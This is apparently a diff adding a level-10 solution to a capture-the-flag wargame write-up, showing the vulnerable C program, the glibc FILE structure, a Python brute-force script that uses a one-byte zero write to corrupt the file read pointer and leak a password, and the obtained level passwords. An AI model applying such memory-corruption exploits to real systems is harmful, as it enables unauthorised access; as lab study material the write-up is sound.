@@ -473,3 +473,117 @@ $ /levels/level09 `python -c'print "\xd4\x94\x04\x08" + "\xd5\x94\x04\x08" + "\x
 $ cat /home/level10/.pass
 UT3ROlnUqI0R2nJA
 ```
+
+## level 10
+
+```
+$ cat /levels/level10.c
+```
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, char **argv){
+    FILE *fp = fopen("/levels/level10.pass", "r");
+    struct {char pass[20], msg_err[20];} pwfile = {{0}};
+    char ptr[0];
+
+    if(!fp || argc != 2)
+        return -1;
+
+    fread(pwfile.pass, 1, 20, fp);
+    pwfile.pass[19] = 0;
+    ptr[atoi(argv[1])] = 0;
+    fread(pwfile.msg_err, 1, 19, fp);
+    fclose(fp);
+
+    if(!strcmp(pwfile.pass, argv[1]))
+        execl("/bin/sh", "sh", 0);
+    else
+        puts(pwfile.msg_err);
+    return 0;
+}
+```
+
+We get to write a 0 to a byte of our choosing.
+
+Look at ```/usr/include/libio.h```.
+
+```cpp
+struct _IO_FILE {
+  int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;   /* Current read pointer */
+  char* _IO_read_end;   /* End of get area. */
+  char* _IO_read_base;  /* Start of putback+get area. */
+  char* _IO_write_base; /* Start of put area. */
+  char* _IO_write_ptr;  /* Current put pointer. */
+  char* _IO_write_end;  /* End of put area. */
+  char* _IO_buf_base;   /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+```
+
+If we can write a 0 after the first read into the last byte of ```_IO_read_ptr``` we should be able to get the program to write the password and not the error message.
+
+```python
+#!/usr/bin/env python
+import subprocess
+import sys
+
+start = 1208000000
+end = 1209000000
+for i in range(start, end):
+    try:
+        output = subprocess.check_output(["/levels//level10", str(i)])
+    except Exception:
+        continue
+    else:
+        if "DENIED" not in output:
+            print i
+            sys.exit()
+```
+
+```
+$ /levels/level10 1208263612
+AveryLoNgPassword!!
+$ /levels/level10 'AveryLoNgPassword!!'
+```
+
+```
+$ cat /home/level11/.pass
+fIpE1GkOkClE0j94
+```
